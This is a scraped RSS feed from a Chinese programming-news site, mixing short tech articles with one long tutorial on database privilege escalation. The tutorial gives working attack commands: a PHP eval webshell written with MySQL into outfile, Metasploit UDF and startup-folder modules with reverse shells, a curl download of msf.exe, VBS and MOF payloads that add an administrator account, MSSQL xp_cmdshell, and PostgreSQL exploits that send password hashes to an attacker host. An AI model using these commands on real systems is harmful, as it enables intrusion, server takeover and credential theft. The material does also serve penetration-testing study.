/// &lt;param name"str"&gt;…阅读更多...全面了解 NGINX 的负载均衡算法NGINX 提供多种负载均衡方法&amp;#xff0c;以应对不同的流量分发需求。常用的算法包括&amp;#xff1a;最少连接、最短时间、通用哈希、随机算法和 IP 哈希。这些负载均衡算法都通过独立指令来定义&amp;#xff0c;每种算法都有其独特的应用场景。 以下负载均衡方法&amp;#xff08;IP 哈希除…阅读更多...VLMEvalKit多模态大模型评测工具源码解析vlmeval/api和vlmeval/vlm文件夹下分别是api接口和本地运行的大模型的代码 基类都是base vlmeval/dataset是数据集处理代码 vlmeval/inference.py是推理代码 run.py的整个流程 
1 vlmeval/api/base.py 
主要为需要与外部API交互的系统提供了一个通用的框架 类属性 allowed_type…阅读更多...Support package for Hovl Studio assets 材质转换器编辑器将仅适用于标准渲染管道的着色器替换为所有材质中的自定义管道。 编辑器只能使用Hovl Studio的资源&amp;#xff01; 此资源还包括用于URP&amp;#xff08;LWRP&amp;#xff09;和HDRP 2019.2的失真着色器以及许多有用的着色器。 
下载&amp;#xff1a;​​Unity资源商店链接资源下载链接…阅读更多...绝对差值的和问题分析&amp;#xff1a; 取模操作的位置不正确&amp;#xff1a; 你在计算 result - max_ 之前没有正确处理大数取模&amp;#xff0c;这可能导致数值溢出。  最大差值减少量的计算&amp;#xff1a; 算法中的内部循环效率较低&amp;#xff0c;可以优化。  
优化后的代码&amp;#xff1a; 
我们可以参考官…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径python 进制、编码《代码大全2》读后感二《代码大全2》读后感三程序员修炼之道：跳出 “小工” 陷阱Amped DVRConv与引擎更新38103：音频转视频容器与解码增强使用 Kotlin 结合 Tesseract OCR 识别验证码Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 15:19:31 +0000</pubDate>
    </item>
    <item>
      <title>WebSocket Secure (WSS)</title>
      <link>https://www.ppmy.cn/news/1540914.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维WebSocket Secure (WSS)news/2025/10/31 23:19:29/使用代理浏览器时，WebSocket Secure (WSS) 链接失败可能由以下原因引起：代理设置问题：确保代理配置正确，包括代理地址和端口。有些代理服务器不支持WebSocket连接，您需要确认您的代理服务是否支持WSS。SSL/TLS 问题：WSS使用SSL/TLS加密，因此代理服务器可能无法正确处理这些连接，导致失败。确保代理服务器支持SSL/TLS。防火墙或安全软件：检查防火墙或安全软件设置，确保它们没有阻止WebSocket连接。浏览器兼容性：确保您使用的浏览器版本支持WebSocket，尤其是安全版本。协议版本：某些代理服务器可能只支持HTTP/1.1，而WSS需要HTTP/2或更高版本。CORS（跨源资源共享）问题：如果您尝试连接到的WebSocket服务器与您的网页不在同一源，可能会遇到CORS问题。确保服务器允许您的域进行连接。您可以尝试以下步骤来解决问题：直接连接到目标服务器，而不使用代理，检查是否仍然存在问题。如果代理服务器支持WebSocket，请确认其配置文件中未禁用WSS支持。考虑更换其他支持WebSocket的代理服务。http://www.ppmy.cn/news/1540914.html相关文章用动态IP软件改变IP地址：探索原理与实用指南‌在数字时代&amp;#xff0c;网络的普及让我们的生活与工作更加便捷&amp;#xff0c;但同时也带来了一系列新的挑战。地域限制、反爬虫机制等问题逐渐凸显&amp;#xff0c;成为了许多网络用户和企业在享受网络便利时必须面对的难题。为了解决这些问题&amp;#xff0c;动态IP软件应运而生&amp;#xf…阅读更多...数据库权限提升GetShell数据库提权总结 - 随风kali - 博客园 (cnblogs.com) 
MySQL 漏洞利用与提权 | 国光 (sqlsec.com) 
sql注入getshell的几种方式 
第99天&amp;#xff1a;权限提升-数据库提权&amp;口令获取&amp;MYSQL&amp;MSSQL&amp;Oracle&amp;MSF 
SQL注入拿shell的方式应该是通用的得到连接数据库…阅读更多...每日一题——第一百一十八题题目&amp;#xff1a;进制转换合集 
#pragma once
#include&lt;stdio.h&gt;
#include&lt;ctype.h&gt;
#include&lt;stdbool.h&gt;
#include&lt;string&gt;/// &lt;summary&gt;
/// 将字符串表示的任意进制数转为十进制
/// &lt;/summary&gt;
/// &lt;param name"str"&gt;…阅读更多...全面了解 NGINX 的负载均衡算法NGINX 提供多种负载均衡方法&amp;#xff0c;以应对不同的流量分发需求。常用的算法包括&amp;#xff1a;最少连接、最短时间、通用哈希、随机算法和 IP 哈希。这些负载均衡算法都通过独立指令来定义&amp;#xff0c;每种算法都有其独特的应用场景。 以下负载均衡方法&amp;#xff08;IP 哈希除…阅读更多...VLMEvalKit多模态大模型评测工具源码解析vlmeval/api和vlmeval/vlm文件夹下分别是api接口和本地运行的大模型的代码 基类都是base vlmeval/dataset是数据集处理代码 vlmeval/inference.py是推理代码 run.py的整个流程 
1 vlmeval/api/base.py 
主要为需要与外部API交互的系统提供了一个通用的框架 类属性 allowed_type…阅读更多...Support package for Hovl Studio assets 材质转换器编辑器将仅适用于标准渲染管道的着色器替换为所有材质中的自定义管道。 编辑器只能使用Hovl Studio的资源&amp;#xff01; 此资源还包括用于URP&amp;#xff08;LWRP&amp;#xff09;和HDRP 2019.2的失真着色器以及许多有用的着色器。 
下载&amp;#xff1a;​​Unity资源商店链接资源下载链接…阅读更多...绝对差值的和问题分析&amp;#xff1a; 取模操作的位置不正确&amp;#xff1a; 你在计算 result - max_ 之前没有正确处理大数取模&amp;#xff0c;这可能导致数值溢出。  最大差值减少量的计算&amp;#xff1a; 算法中的内部循环效率较低&amp;#xff0c;可以优化。  
优化后的代码&amp;#xff1a; 
我们可以参考官…阅读更多...适合学生党的平价蓝牙耳机有哪些？四款便宜又好的蓝牙耳机盘点在寻找适合学生党的平价蓝牙耳机时&amp;#xff0c;我们总是希望能在有限的预算内找到性能卓越、品质可靠的产品&amp;#xff0c;毕竟&amp;#xff0c;对于学生而言&amp;#xff0c;性价比是选择耳机时的重要考量因素&amp;#xff0c;那么适合学生党的平价蓝牙耳机有哪些&amp;#xff1f;市面上琳琅满目…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径python 进制、编码《代码大全2》读后感二《代码大全2》读后感三程序员修炼之道：跳出 “小工” 陷阱Amped DVRConv与引擎更新38103：音频转视频容器与解码增强使用 Kotlin 结合 Tesseract OCR 识别验证码Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 15:19:30 +0000</pubDate>
    </item>
    <item>
      <title>用动态IP软件改变IP地址：探索原理与实用指南‌</title>
      <link>https://www.ppmy.cn/news/1540913.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维用动态IP软件改变IP地址：探索原理与实用指南‌news/2025/10/31 23:19:28/在数字时代，网络的普及让我们的生活与工作更加便捷，但同时也带来了一系列新的挑战。地域限制、反爬虫机制等问题逐渐凸显，成为了许多网络用户和企业在享受网络便利时必须面对的难题。为了解决这些问题，动态IP软件应运而生，成为了一种重要的网络工具。本文将深入探讨动态IP软件的工作原理，并提供一份实用的操作指南，帮助您更好地了解和运用这一工具。一、动态IP软件的工作原理动态IP软件通过建立与代理服务器的连接，为用户分配一个新的IP地址。当用户通过该软件访问互联网时，其网络请求会先发送到代理服务器，然后由服务器转发到目标网站或服务。这样，目标网站或服务看到的就是代理服务器的IP地址，而不是用户的真实IP地址。当用户断开连接或重新连接时，软件会为用户分配一个新的IP地址，从而实现IP地址的动态更换。二、选择动态IP软件的注意事项确保安全性‌：选择信誉良好、有严格安全措施和隐私政策的服务提供商，避免使用可能存在安全隐患的代理。‌考虑稳定性和速度‌：代理服务器的稳定性和速度对用户体验至关重要，建议选支持免费试用的，以便提前测试和验证。功能与兼容性：根据实际需求选择具有所需功能的软件，并确保其与您的设备和操作系统兼容。三、使用动态IP软件改变IP地址的步骤在众多动态IP软件中，虎观代理以其贴心的安全保障、多样的IP资源、易上手的操作界面以及提供免费试用的机会，成为了用户心中的优选，收获了广泛好评。具体操作步骤如下：下载安装：从动态IP软件官方网站下载并安装至电脑或手机。注册登录：打开软件并按照提示进行注册和登录操作。一键连接：在软件内选择一个合适的服务器节点，并点击“一键更换IP”按钮。温馨提示：如果不确定是否更改成功，可使用浏览器访问专业IP查询网站，若结果与动态IP软件上一致，则说明IP更改成功。‌结尾‌：通过本文的介绍，我们了解了动态IP软件的工作原理、选择软件的注意事项以及实用的操作指南，动态IP软件作为一种便捷的工具，能够帮助我们轻松改变自己的IP地址，保护隐私、绕过地域限制或进行特定的网络活动。然而，在使用过程中，我们也需要遵守当地的法律法规和道德准则。往期推荐：网易云怎么改ip地址归属地知道ip地址怎么看网络地址怎么样改变手机IP地址‌？四种方法，轻松学会http://www.ppmy.cn/news/1540913.html相关文章数据库权限提升GetShell数据库提权总结 - 随风kali - 博客园 (cnblogs.com) 
MySQL 漏洞利用与提权 | 国光 (sqlsec.com) 
sql注入getshell的几种方式 
第99天&amp;#xff1a;权限提升-数据库提权&amp;口令获取&amp;MYSQL&amp;MSSQL&amp;Oracle&amp;MSF 
SQL注入拿shell的方式应该是通用的得到连接数据库…阅读更多...每日一题——第一百一十八题题目&amp;#xff1a;进制转换合集 
#pragma once
#include&lt;stdio.h&gt;
#include&lt;ctype.h&gt;
#include&lt;stdbool.h&gt;
#include&lt;string&gt;/// &lt;summary&gt;
/// 将字符串表示的任意进制数转为十进制
/// &lt;/summary&gt;
/// &lt;param name"str"&gt;…阅读更多...全面了解 NGINX 的负载均衡算法NGINX 提供多种负载均衡方法&amp;#xff0c;以应对不同的流量分发需求。常用的算法包括&amp;#xff1a;最少连接、最短时间、通用哈希、随机算法和 IP 哈希。这些负载均衡算法都通过独立指令来定义&amp;#xff0c;每种算法都有其独特的应用场景。 以下负载均衡方法&amp;#xff08;IP 哈希除…阅读更多...VLMEvalKit多模态大模型评测工具源码解析vlmeval/api和vlmeval/vlm文件夹下分别是api接口和本地运行的大模型的代码 基类都是base vlmeval/dataset是数据集处理代码 vlmeval/inference.py是推理代码 run.py的整个流程 
1 vlmeval/api/base.py 
主要为需要与外部API交互的系统提供了一个通用的框架 类属性 allowed_type…阅读更多...Support package for Hovl Studio assets 材质转换器编辑器将仅适用于标准渲染管道的着色器替换为所有材质中的自定义管道。 编辑器只能使用Hovl Studio的资源&amp;#xff01; 此资源还包括用于URP&amp;#xff08;LWRP&amp;#xff09;和HDRP 2019.2的失真着色器以及许多有用的着色器。 
下载&amp;#xff1a;​​Unity资源商店链接资源下载链接…阅读更多...绝对差值的和问题分析&amp;#xff1a; 取模操作的位置不正确&amp;#xff1a; 你在计算 result - max_ 之前没有正确处理大数取模&amp;#xff0c;这可能导致数值溢出。  最大差值减少量的计算&amp;#xff1a; 算法中的内部循环效率较低&amp;#xff0c;可以优化。  
优化后的代码&amp;#xff1a; 
我们可以参考官…阅读更多...适合学生党的平价蓝牙耳机有哪些？四款便宜又好的蓝牙耳机盘点在寻找适合学生党的平价蓝牙耳机时&amp;#xff0c;我们总是希望能在有限的预算内找到性能卓越、品质可靠的产品&amp;#xff0c;毕竟&amp;#xff0c;对于学生而言&amp;#xff0c;性价比是选择耳机时的重要考量因素&amp;#xff0c;那么适合学生党的平价蓝牙耳机有哪些&amp;#xff1f;市面上琳琅满目…阅读更多...【人工智能-初级】第6章 决策树和随机森林：浅显易懂的介绍及Python实践文章目录 一、决策树简介二、决策树的构建原理2.1 决策树的优缺点优点缺点 三、随机森林简介3.1 随机森林的构建过程3.2 随机森林的优缺点优点缺点 四、Python实现决策树和随机森林4.1 导入必要的库4.2 加载数据集并进行预处理4.3 创建决策树模型并进行训练4.4 可视化决策树4.5…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径python 进制、编码《代码大全2》读后感二《代码大全2》读后感三程序员修炼之道：跳出 “小工” 陷阱Amped DVRConv与引擎更新38103：音频转视频容器与解码增强使用 Kotlin 结合 Tesseract OCR 识别验证码Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 15:19:29 +0000</pubDate>
    </item>
    <item>
      <title>数据库权限提升GetShell</title>
      <link>https://www.ppmy.cn/news/1540912.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维数据库权限提升GetShellnews/2025/10/31 23:19:27/数据库提权总结 - 随风kali - 博客园 (cnblogs.com)MySQL 漏洞利用与提权 | 国光 (sqlsec.com)sql注入getshell的几种方式第99天：权限提升-数据库提权&amp;口令获取&amp;MYSQL&amp;MSSQL&amp;Oracle&amp;MSFSQL注入拿shell的方式应该是通用的得到连接数据库权限之后,利用本身自带的方式从数据库权限提升到机器的权限,本文中的其他数据库利用方式也是这样的,利用自身的漏洞或者配置问题从数据库权限提权得到整个机器的权限,跟Webshell是一样得到道理只是对象从网站80换成了数据库3306等等,最终的目标就是拿到机器权限,网站是上传exe数据库大多数是执行语句反弹…除Access数据库外，其他数据库基本都存在数据库提权的可能)下列备份配置文件一般会存储加密后的数据库连接密码,拿去解密即可得到明文连接进行后续提权操作,提权前置基础都是取得了账户密码连接数据库[//]: # (select version(）或者数据库版本选择对应的导出方式) 并且安全模式没有限制写入如果限制了就宣告失败，提权都是需要写文件进去的或者是inc目录下conn或者data文件SQL注入Webshellinto outfile导出函数into outfile是MySQL数据库中的一个导出函数，它可以将查询结果写入到文件中条件root权限可以读写使用单引号知晓网站根目录绝对路径[//]: # (SELECT @@basedir; 可以知晓mysql的安装路径 \Extensions\MySQL8.0.12)secure_file_priv[//]: # (筛Q飞来普瑞死)没有具体 限在mysql 5.6.34版本以后secure_file_priv的值默认为nullshow global variables like "%secure%"; // 查询secure_file_priv属性开启状态如下情况代表无法写入,修改这个值只能手动为空使用此语句写入文件到特定目录saber为语句内容,写入成功则根据目录连接webshell// 有就创建没有就写入,前提是可写并且知道网站根目录select 'saber' into outfile  'C:/Users/abc/Desktop/66.txt'; select '&lt;?php eval($_GET[pass]);?&gt;' into outfile  'B:\\phpstudy_pro\\WWW\\webshell\\saber.php';load_file读文件读取函数会在页面上回显出文件内的信息条件存在开启日志记录和更换日志root权限知晓网站根目录绝对路径secure_file_priv值允许对该路径下的文件进行操作((为空或有路径)日志写shell日志改为脚本文件，将shell记录进日志来写shell,与导出函数写shell相比，规避了secure_file_priv的限制存在开启日志记录和更换日志root权限知晓网站根目录绝对路径os-shellOracle数据库不支持原理通过into oufil向服务器写入两个文件，，一个进行上传文件一个可以直接执行系统命令,首先上传第一个可以上传文件的php,再通过这个可以上传文件的php去上传可以命令执行的php,并将输出的内容返回sqlmap端第一步向目标靶机写一个上传的webshell脚本，然后利用上传脚本上传一个执行系统命令的webshell此为sqlmap的一个命令,--os-shell就是使用udf提权获取WebShell条件知晓网站根目录绝对路径secure_file_priv[//]: # (筛Q飞来普瑞死)没有具体 限在mysql 5.6.34版本以后secure_file_priv的值默认为null要求为数据库DBA,--is-dba检查当前网站连接的数据库账号是否为mysql user表中的管理员如root高权限用户tmpbeewq.php 用来执行系统命令
tmpuqvgw.php 用来上传文件MySQL提权 3306默认不支持外联条件**服务器开启数据库服务 **获得最高权限用户 应该无所谓本来就是为了拿机器权限而不是数据库权限**secure_file_priv**** 无限制**UDF提权原理UDF拓展接口 自定义函数，是数据库功能的一种扩展。用户通􏰁自定义函数可以实现在MySQL中无法方便实现的功能，其添加的新函数都可以在SQL语句中调用注意：如果是MySQL &gt;= 5.1的版本，必须把UDF的动态链接库文件放置于MySQL安装目录下的lib\plugin文件夹下文件夹下才能创建自定义函数,常用的工具sqlmap和Metasploit里面都自带了对应系统的动态链接库文件；,不能直接用怕被杀还需要解码,mysql&lt;5.2 导出目录 c:/windows或system32
mysql=&gt;5.2 导出安装目录 /lib/plugin/  (没有就手工创建)// 获取mysql的安装路径 \Extensions\MySQL8.0.12\SELECT @@basedir;MSF模块UDF提权MSF模块提供了UDF提权功能,它会将dll文件写入lib\plugin\目录下,该dll文件中包含sys_exec()和sys_eval()两个函数，但是默认只创建sys_exec()函数，该函数执行并不会有回显。我们可以手动创建sys_eval()函数，来执行有回显的命令 （前提开始外链,命令开启）# 允许外部连接但另外条件是必须为空允许写入 secure_file_priv="",但是已经得到权限了那么自然这里也是为空 
GRANT ALL PRIVILEGES ON *.* TO '帐号'@'%' IDENTIFIED BY '密码' WITH GRANT OPTION;命令执行后创建%代表是允许任何用户连接,可以用navicat数据库远程连接,哥斯拉这类工具可以连接的原因是以为是利用webshell脚本去连接,等于是内部至内部过程,navicat属于外部连接内部,MSF连接前也需要是允许外链才可以use exploit/multi/mysql/mysql_udf_payload
set payload windows/meterpreter/reverse_tcp
set password root
set username root
set rhosts 47.102.195.100
run执行后在网站安装目录下写入dll文件上传完成后在数据库执行语句创建函数绑定该上传的dll,上传了dll后才能执行绑定的命令create function sys_eval returns string soname "saber.dll";从而利用绑定好的函数里面的eval执行系统命令,既然可以执行系统命令那么可以远程下载文件造成木马上线主机.我们一直连接的是数据库并权限不是web权限,所以不能直接上线的,数据库里面只有表只能通过执行命令上线,不要误解了,远程上线操作在文章中体现,远程下载exe执行select sys_eval('curl http://192.168.172.131:8000/msf.exe --output msf.exe');详细过程看上面文章创建自定义函数并调用命令mysql &gt; CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.dll';导入成功后查看一下mysql函数里面是否新增了sys_evalmysql&gt; select * from mysql.func;
+----------+-----+---------+----------+
| name     | ret | dl      | type     |
+----------+-----+---------+----------+
| sys_eval |   0 | udf.dll | function |
+----------+-----+---------+----------+名称支持自定义,然后利用此函数执行命令比如增加用户mysql &gt; select sys_eval('whoami');UDF一键提权利用暗月师傅的马子 正常上传上去,然后一键提权启动项提权原理mysql把一段vbs脚本导入到系统的启动项下，如果管理员启动或者重启的服务器，那么该脚本就会被调用，并执行vbs脚本里面的命令mysql写入启动项mysql &gt; select 0xfaba7dcce8bc7a0273ae516626177f0b826970742E4372656174654F626A6563742822575363726970742E5368656C6C22290A5773685368656C6C2E52756E20226E65742075736572206861636B6572205040737377307264202F616464222C20300A5773685368656C6C2E52756E20226E6574206C6F63616C67726F75702061646D696E6973747261746F7273206861636B6572202F616464222C20300A into dumpfile "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\test.vbs";MSF启动项模块利用MSF模块向机器启动目录上传木马文件,开启监听服务器重启后执行上线exeuse exploit/windows/mysql/mysql_start_up
set rhosts 47.102.195.100
set username root
set password root
set AllowNoCleanup true
run反弹shell提权Mysql提权之反弹shell原来和UDF一致都是写入.dll文件创建命令执行语句这个要写入的太多了用的时候在文章里粘贴吧nc -vvp 7788  // 攻击机监听端口MOF提权支持提权版本只有2003和一些之前的版本原理MOF文件每五秒就会执行，而且是系统权限，我们通过mysql使用load_file将文件入/wbme/mof，然后系统每隔五秒就会执行一次我们上传的MOF文件。MOF当中有一段是vbs脚本,通过控制这段vbs脚本的内容比如创建用户这些,进行提权#pragma namespace("\\\\.\\root\\subscription") instance of __EventFilter as $EventFilter 
{ EventNamespace = "Root\\Cimv2"; Name  = "filtP2"; Query = "Select * From __InstanceModificationEvent " "Where TargetInstance Isa \"Win32_LocalTime\" " "And TargetInstance.Second = 5"; QueryLanguage = "WQL"; 
}; instance of ActiveScriptEventConsumer as $Consumer 
{ Name = "consPCSV2"; ScriptingEngine = "JScript"; ScriptText = 
"var WSH = new ActiveXObject(\"WScript.Shell\")\nWSH.run(\"net.exe user hacker P@ssw0rd /add\")\nWSH.run(\"net.exe localgroup administrators hacker /add\")"; 
}; instance of __FilterToConsumerBinding 
{ Consumer   = $Consumer; Filter = $EventFilter; 
};利用into dumpfile导出函数写入文件到指定目录mysql &gt; select 0x23ADd49dfDEF107045BD69845DDaDbb7293B819finto dumpfile "C:/windows/system32/wbem/mof/test.mof";MSSQL/SQL Server提权 1433Getshellsqlserver命令注入和getshell通过Mssql提权的几种姿势 - N0r4h条件前提得知绝对路径，并且可写站库不分离 站库是一体的数据库必须被备份过一次xp_cmdshell提权xp_cmdshell作用类似于mysql udf，其本质是一些sql语句的集合如果xp_cmdshell被删除了，可以上传xplog70.dll进行恢复exec master.sys.sp_addextendedproc 'xp_cmdshell', 'C:\Program Files\Microsoft SQL Server\MSSQL\Binn\xplog70.dll'注意：xp_cmdshell在mssql2000中开启，在2005之后就是默认禁止的，我们需要Systemadmin Sa权限来开启xp_cmdshell开启命令启用：
EXEC sp_configure 'show advanced options', 1
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;关闭：
exec sp_configure 'show advanced options', 1;
reconfigure;
exec sp_configure 'x p_cmdshell', 0;
reconfigure;EXEC master.dbo.xp_cmdshell 'whoami'   // 执行命令脚本sp_oacreate可以删除、复制、移动文件，可以配合sp_oamethod来写文件执行cmd,原理调用OLE对象，利用OLE对象的run方法执行系统命令但是此方法没有回显 所以一般用于xp_cmdshell无法使用时启用：
EXEC sp_configure 'show advanced options', 1;   
RECONFIGURE WITH OVERRIDE;   
EXEC sp_configure 'Ole Automation Procedures', 1;   
RECONFIGURE WITH OVERRIDE;   关闭：
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE WITH OVERRIDE;   
EXEC sp_configure 'Ole Automation Procedures', 0;   
RECONFIGURE WITH OVERRIDE;调用cmd写入文件declare @shell int exec sp_oacreate 'wscript.shell',@shell output 
exec sp_oamethod @shell,'run',null,'c:\windows\system32\cmd.exe /c whoami &gt;c:\\1.txt'沙盒提权执行命令方法无法使用时，可以使用沙盒进行提权,属于一种安全功能,操作看开篇文章吧条件PostgreSQL数据库 5432PostgreSQL关系型数据库9.3-11版本存在一处特性.管理员或者具有'COPY TO/FROM PROGRAM'权限的用户,可以使用此特性执行任意命令提权利用漏洞CVE-2018-1058 
CVE-2019-9193CVE-2018-1058 管理员触发反弹漏洞复现本地Docker启动环境普通用户登录执行SQL语句执行反弹shell,管理员用户操作数据库触发sql语句即可反弹docker compose up -d通过提供的普通用户账户密码连接PostgreSQL数据库准备执行反弹shell语句,注意修改其中的IP地址,改为攻击机的地址,也就是反弹给谁CREATE FUNCTION public.array_to_string(anyarray,text) RETURNS TEXT AS $$select dblink_connect((select 'hostaddr=192.168.111.131 port=5432 user=postgres password=chybeta sslmode=disable dbname='||(SELECT passwd FROM pg_shadow WHERE usename='postgres'))); SELECT pg_catalog.array_to_string($1,$2);
$$ LANGUAGE SQL VOLATILE;打开Kali启动NC监听,接下来就是等待管理员操作数据库的时候就会触发反弹shellnc -lvvp 5432漏洞复现假装自己是管理员操作了数据库，攻击机机会收到返回的shell但是我没有任何反应docker compose exec postgres pg_dump -U postgres -f evil.bak vulhubCVE-2019-9193 命令执行Postgres默认的5432端口，默认账号密码为postgres/postgres。默认管理员账户密码,登录上去后直接命令执行的POC这个是SQL语句所以数据库提权都是围绕执行SQL语句docker compose up -dDocker镜像一直拉不下来,开启在线的Vulhub靶场了,通过给到的地址和账户密码连接数据选择新建查询后执行带有命令执行的SQL语句成功回显,替换远程下载木马不就是可以拿到权限了DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';  // cat /etc/passwd
SELECT * FROM cmd_exec;Oracle提权 1521oracle提权执行命令工具oracleShell v0.1注入存储过程提权SYS创建的存储过程存在sql注入。拥有create procedure权限的用户通过创建提权函数，将提权函数注入到存储过程中，于是该存储过程将调用这个提权函数来执行grant dba to quan命令，获得Oracle数据库dba权限http://www.ppmy.cn/news/1540912.html相关文章每日一题——第一百一十八题题目&amp;#xff1a;进制转换合集 
#pragma once
#include&lt;stdio.h&gt;
#include&lt;ctype.h&gt;
#include&lt;stdbool.h&gt;
#include&lt;string&gt;/// &lt;summary&gt;
/// 将字符串表示的任意进制数转为十进制
/// &lt;/summary&gt;
/// &lt;param name"str"&gt;…阅读更多...全面了解 NGINX 的负载均衡算法NGINX 提供多种负载均衡方法&amp;#xff0c;以应对不同的流量分发需求。常用的算法包括&amp;#xff1a;最少连接、最短时间、通用哈希、随机算法和 IP 哈希。这些负载均衡算法都通过独立指令来定义&amp;#xff0c;每种算法都有其独特的应用场景。 以下负载均衡方法&amp;#xff08;IP 哈希除…阅读更多...VLMEvalKit多模态大模型评测工具源码解析vlmeval/api和vlmeval/vlm文件夹下分别是api接口和本地运行的大模型的代码 基类都是base vlmeval/dataset是数据集处理代码 vlmeval/inference.py是推理代码 run.py的整个流程 
1 vlmeval/api/base.py 
主要为需要与外部API交互的系统提供了一个通用的框架 类属性 allowed_type…阅读更多...Support package for Hovl Studio assets 材质转换器编辑器将仅适用于标准渲染管道的着色器替换为所有材质中的自定义管道。 编辑器只能使用Hovl Studio的资源&amp;#xff01; 此资源还包括用于URP&amp;#xff08;LWRP&amp;#xff09;和HDRP 2019.2的失真着色器以及许多有用的着色器。 
下载&amp;#xff1a;​​Unity资源商店链接资源下载链接…阅读更多...绝对差值的和问题分析&amp;#xff1a; 取模操作的位置不正确&amp;#xff1a; 你在计算 result - max_ 之前没有正确处理大数取模&amp;#xff0c;这可能导致数值溢出。  最大差值减少量的计算&amp;#xff1a; 算法中的内部循环效率较低&amp;#xff0c;可以优化。  
优化后的代码&amp;#xff1a; 
我们可以参考官…阅读更多...适合学生党的平价蓝牙耳机有哪些？四款便宜又好的蓝牙耳机盘点在寻找适合学生党的平价蓝牙耳机时&amp;#xff0c;我们总是希望能在有限的预算内找到性能卓越、品质可靠的产品&amp;#xff0c;毕竟&amp;#xff0c;对于学生而言&amp;#xff0c;性价比是选择耳机时的重要考量因素&amp;#xff0c;那么适合学生党的平价蓝牙耳机有哪些&amp;#xff1f;市面上琳琅满目…阅读更多...【人工智能-初级】第6章 决策树和随机森林：浅显易懂的介绍及Python实践文章目录 一、决策树简介二、决策树的构建原理2.1 决策树的优缺点优点缺点 三、随机森林简介3.1 随机森林的构建过程3.2 随机森林的优缺点优点缺点 四、Python实现决策树和随机森林4.1 导入必要的库4.2 加载数据集并进行预处理4.3 创建决策树模型并进行训练4.4 可视化决策树4.5…阅读更多...电子商务网站维护技巧：保持WordPress、主题和插件的更新在这个快节奏的数字时代&amp;#xff0c;维护一个电子商务网站的首要任务之一是保持WordPress、主题和插件的最新状态。过时的软件不仅可能导致功能故障&amp;#xff0c;还可能带来安全风险。本文将深入探讨如何有效地更新和维护您的WordPress网站&amp;#xff0c;以确保其安全性和性能。 
…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径python 进制、编码《代码大全2》读后感二《代码大全2》读后感三程序员修炼之道：跳出 “小工” 陷阱Amped DVRConv与引擎更新38103：音频转视频容器与解码增强使用 Kotlin 结合 Tesseract OCR 识别验证码Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 15:19:28 +0000</pubDate>
    </item>
    <item>
      <title>每日一题——第一百一十八题</title>
      <link>https://www.ppmy.cn/news/1540911.html</link>
